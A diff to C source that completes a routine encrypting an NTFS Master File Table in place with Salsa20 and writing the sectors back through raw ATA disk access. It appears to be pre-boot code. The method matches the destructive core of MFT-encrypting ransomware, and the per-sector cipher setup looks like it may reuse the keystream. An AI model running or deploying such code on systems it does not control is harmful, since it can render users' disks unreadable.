@@ -86,7 +86,7 @@ static int ntfs_mft_crypt(const char *password, uint32_t partition_lba, int encr
 
     // find MFT location
     uint32_t mft_lba;
-    if (get_mft_lba(partition_lba, mft_lba) != 0)
+    if (get_mft_lba(partition_lba, &mft_lba) != 0)
     {
         vga_puts("Failed to retrieve MFT!\n");
         return -1;
@@ -122,8 +122,27 @@ static int ntfs_mft_crypt(const char *password, uint32_t partition_lba, int encr
 
         Salsa20_Ctx ctx;
         salsa20_init(&ctx, key, nonce, 0);
+        salsa20_encrypt(&ctx, sector_buffer, out_buffer, 512);
 
+        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
+        {
+            vga_puts("\nWrite error at sector ");
+            vga_put_dec(mft_lba + i);
+            vga_putchar('\n');
+
+            return -1;
+        }
+
+        if (i % 16 == 0)
+            vga_putchar('#');
     }
+
+    vga_puts("]\nDone.\n");
+
+    for (int i = 0; i < 32; i++)
+        key[i] = 0;
+
+    return 0;
 }
 
 int ntfs_generate_salt(void)
